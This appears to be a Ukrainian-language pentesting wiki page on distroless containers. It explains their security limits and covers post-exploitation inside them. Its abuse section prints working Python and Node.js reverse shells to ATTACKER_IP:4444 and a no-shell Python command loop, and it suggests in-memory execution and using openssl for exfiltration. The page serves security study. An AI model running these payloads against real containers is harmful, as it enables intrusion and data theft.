# Distroless контейнери

{{#include ../../../banners/hacktricks-training.md}}

## Огляд

A **distroless** container image — це образ, який містить **мінімальні компоненти середовища виконання, необхідні для запуску одного конкретного застосунку**, водночас умисно видаляючи звичайні інструменти дистрибутива, такі як package managers, shell-и та великі набори утиліт користувацького простору. На практиці distroless-образи часто містять лише бінарник або runtime застосунку, його спільні бібліотеки, набори сертифікатів та дуже невелику структуру файлової системи.

Суть не в тому, що distroless — це новий примітив ізоляції ядра. Distroless — це **стратегія проєктування образів**. Вона змінює те, що доступне **всередині** файлової системи контейнера, а не те, як ядро ізолює контейнер. Це розрізнення важливе, бо distroless ущільнює середовище переважно шляхом зменшення того, чим може скористатися атакуючий після отримання виконання коду. Вона не замінює namespaces, seccomp, capabilities, AppArmor, SELinux чи будь-який інший механізм ізоляції під час виконання.

## Навіщо потрібні distroless images

Distroless-образи використовують насамперед для зменшення:

- розміру образу
- операційної складності образу
- кількості пакетів і бінарників, які можуть містити вразливості
- кількості інструментів пост-експлуатації, доступних атакуючому за замовчуванням

Саме тому distroless-образи популярні в продакшн-розгортаннях застосунків. Контейнер без shell-а, package manager-а і майже без загального інструментарію зазвичай легше піддається операційному аналізу і складніше використовується інтерактивно після компрометації.

Прикладами відомих сімейств образів у стилі distroless є:

- Google's distroless images
- Chainguard hardened/minimal images

## Чого Distroless НЕ означає

Distroless контейнер **не** означає автоматично:

- rootless
- non-privileged
- read-only
- захищений seccomp, AppArmor або SELinux
- безпечний від container escape

Досі можливо запустити distroless-образ з `--privileged`, зі спільними просторами імен хоста, небезпечними bind mounts або змонтованим runtime socket-ом. У такому сценарії образ може бути мінімальним, але контейнер усе одно може бути катастрофічно незахищеним. Distroless змінює **поверхню атаки користувацького простору**, а не **межу довіри ядра**.

## Типові операційні характеристики

Коли ви компрометуєте distroless-контейнер, перше, що зазвичай помічаєте — звичні припущення перестають бути істинними. Може не бути `sh`, `bash`, `ls`, `id`, `cat`, а іноді навіть libc-based середовища, яке поводиться так, як очікує ваша звична тактика. Це впливає як на напад, так і на захист, бо відсутність інструментів змінює підхід до налагодження, реагування на інциденти та пост-експлуатації.

Найпоширеніші патерни:

- існує runtime застосунку, але майже нічого іншого
- shell-орієнтовані payload-и падають, бо shell відсутній
- звичні one-liner-скрипти для рекогнісцировки не працюють через відсутність допоміжних бінарників
- захисти файлової системи, такі як read-only rootfs або `noexec` на записуваних tmpfs-локаціях, часто також присутні

Ця комбінація зазвичай призводить до розмов про «озброєння distroless».

## Distroless And Post-Exploitation

The main offensive challenge in a distroless environment is not always the initial RCE. Частіше складність полягає в тому, що йде далі. Якщо вразливий workload дає виконання коду в language runtime, такому як Python, Node.js, Java або Go, ви можете виконувати довільну логіку, але не через звичні shell-центричні робочі процеси, які типовi для інших Linux-цілей.

Це означає, що пост-експлуатація часто зміщується в один з трьох напрямків:

1. **Use the existing language runtime directly** для рекогнісцировки середовища, відкриття сокетів, читання файлів або стаджингу додаткових payload-ів.
2. **Bring your own tooling into memory** якщо файлова система read-only або записувані локації змонтовані з `noexec`.
3. **Abuse existing binaries already present in the image** якщо застосунок або його залежності включають щось несподівано корисне.

## Зловживання

### Перевірте існуючий runtime

У багатьох distroless-контейнерах немає shell-а, але все ще є runtime застосунку. Якщо ціль — Python service, Python там є. Якщо ціль — Node.js, Node там є. Це часто дає достатньо функціональності, щоб перелічити файли, читати змінні оточення, відкрити reverse shells і підготувати виконання в пам'яті, ніколи не викликаючи `/bin/sh`.

Простий приклад з Python:
```bash
python3 - <<'PY'
import os, socket, subprocess
print("uid", os.getuid())
print("cwd", os.getcwd())
print("env keys", list(os.environ)[:20])
print("root files", os.listdir("/")[:30])
PY
```
Простий приклад з Node.js:
```bash
node -e 'const fs=require("fs"); console.log(process.getuid && process.getuid()); console.log(fs.readdirSync("/").slice(0,30)); console.log(Object.keys(process.env).slice(0,20));'
```
Impact:

- відновлення змінних середовища, часто включаючи credentials або service endpoints
- перелічення файлової системи без `/bin/ls`
- виявлення шляхів з правом запису та змонтованих secrets

### Reverse Shell без `/bin/sh`

Якщо образ не містить `sh` або `bash`, класичний shell-based reverse shell може негайно не спрацювати. У такому випадку використайте встановлений runtime мови натомість.

Python reverse shell:
```bash
python3 - <<'PY'
import os,pty,socket
s=socket.socket()
s.connect(("ATTACKER_IP",4444))
for fd in (0,1,2):
os.dup2(s.fileno(),fd)
pty.spawn("/bin/sh")
PY
```
Якщо `/bin/sh` не існує, замініть останній рядок безпосереднім виконанням команд за допомогою Python або Python REPL loop.

Node reverse shell:
```bash
node -e 'var net=require("net"),cp=require("child_process");var s=net.connect(4444,"ATTACKER_IP",function(){var p=cp.spawn("/bin/sh",[]);s.pipe(p.stdin);p.stdout.pipe(s);p.stderr.pipe(s);});'
```
Знову: якщо `/bin/sh` відсутній, використовуйте безпосередньо API файлової системи, процесів і мережі Node замість spawning a shell.

### Повний приклад: No-Shell Python Command Loop

Якщо образ має Python, але shell взагалі відсутній, простий інтерактивний цикл часто достатній, щоб зберегти повну post-exploitation здатність:
```bash
python3 - <<'PY'
import os,subprocess
while True:
cmd=input("py> ")
if cmd.strip() in ("exit","quit"):
break
p=subprocess.run(cmd, shell=True, capture_output=True, text=True)
print(p.stdout, end="")
print(p.stderr, end="")
PY
```
Цьому не потрібен interactive shell binary. Наслідки по суті ті ж, що й від базового shell з точки зору зловмисника: command execution, enumeration та staging of further payloads через існуючий runtime.

### Виконання інструментів у пам'яті

Distroless images часто комбінуються з:

- `readOnlyRootFilesystem: true`
- writable but `noexec` tmpfs such as `/dev/shm`
- відсутністю інструментів керування пакетами

Таке поєднання робить класичні workflow-і "download binary to disk and run it" ненадійними. У таких випадках основним рішенням стають техніки виконання в пам'яті.

The dedicated page for that is:

{{#ref}}
../../bypass-bash-restrictions/bypass-fs-protections-read-only-no-exec-distroless/
{{#endref}}

Найбільш релевантні техніки там:

- `memfd_create` + `execve` via scripting runtimes
- DDexec / EverythingExec
- memexec
- memdlopen

### Існуючі бінарні файли, які вже є в образі

Деякі distroless images досі містять бінарні файли, необхідні для роботи, які стають в пригоді після компрометації. Часто спостережуваний приклад — `openssl`, бо додаткам іноді потрібен він для crypto- або TLS-пов'язаних задач.

A quick search pattern is:
```bash
find / -type f \( -name openssl -o -name busybox -o -name wget -o -name curl \) 2>/dev/null
```
Якщо присутній `openssl`, його може бути використано для:

- outbound TLS connections
- data exfiltration over an allowed egress channel
- staging payload data through encoded/encrypted blobs

Точне зловживання залежить від того, що саме встановлено, але загальна ідея така: distroless не означає «відсутність інструментів взагалі»; це означає «набагато менше інструментів, ніж у звичайному образі дистрибуції».

## Checks

Мета цих перевірок — визначити, чи образ насправді є distroless на практиці, і які runtime або допоміжні бінарні файли все ще доступні для post-exploitation.
```bash
find / -maxdepth 2 -type f 2>/dev/null | head -n 100          # Very small rootfs is common in distroless images
which sh bash ash busybox python python3 node java 2>/dev/null   # Identify which runtime or shell primitives exist
cat /etc/os-release 2>/dev/null                                # Often missing or minimal
mount | grep -E ' /( |$)|/dev/shm'                             # Check for read-only rootfs and writable tmpfs
```
Що тут цікаво:

- Якщо shell відсутній, але присутній runtime, такий як Python або Node, post-exploitation має переключитися на виконання, кероване runtime.
- Якщо коренева файлова система доступна лише для читання, а `/dev/shm` записуваний, але з `noexec`, техніки виконання в пам'яті стають набагато більш релевантними.
- Якщо присутні допоміжні бінарні файли, такі як `openssl`, `busybox` або `java`, вони можуть надати достатньо функціональності для bootstrap подальшого доступу.

## Налаштування Runtime за замовчуванням

| Стиль образу / платформи | Стан за замовчуванням | Типова поведінка | Типові ручні ослаблення |
| --- | --- | --- | --- |
| Google distroless style images | Мінімальний userland за задумом | Немає shell, немає package manager, лише залежності додатку/runtime | додавання debug-шарів, sidecar shell'ів, копіювання busybox або інструментів |
| Chainguard minimal images | Мінімальний userland за задумом | Зменшена surface пакетів, часто зосереджена на одному runtime або сервісі | використання `:latest-dev` або debug-варіантів, копіювання інструментів під час збірки |
| Kubernetes workloads using distroless images | Залежить від Pod config | Distroless впливає лише на userland; Pod security posture все ще залежить від Pod spec і runtime defaults | додавання тимчасових debug-контейнерів, host mounts, привілейовані налаштування Pod |
| Docker / Podman running distroless images | Залежить від run flags | Мінімальна файлова система, але безпека runtime усе ще залежить від флагів і конфігурації демона | `--privileged`, host namespace sharing, runtime socket mounts, writable host binds |

Ключовий момент: distroless — це **властивість образу**, а не runtime-захист. Його цінність полягає у зменшенні того, що доступне всередині файлової системи після компрометації.

## Пов'язані сторінки

Для обхідних шляхів файлової системи та виконання в пам'яті, які часто потрібні в distroless-середовищах:

{{#ref}}
../../bypass-bash-restrictions/bypass-fs-protections-read-only-no-exec-distroless/
{{#endref}}

Для зловживань контейнерним runtime, сокетом і монтами, що все ще застосовуються до distroless-навантажень:

{{#ref}}
runtime-api-and-daemon-exposure.md
{{#endref}}

{{#ref}}
sensitive-host-mounts.md
{{#endref}}
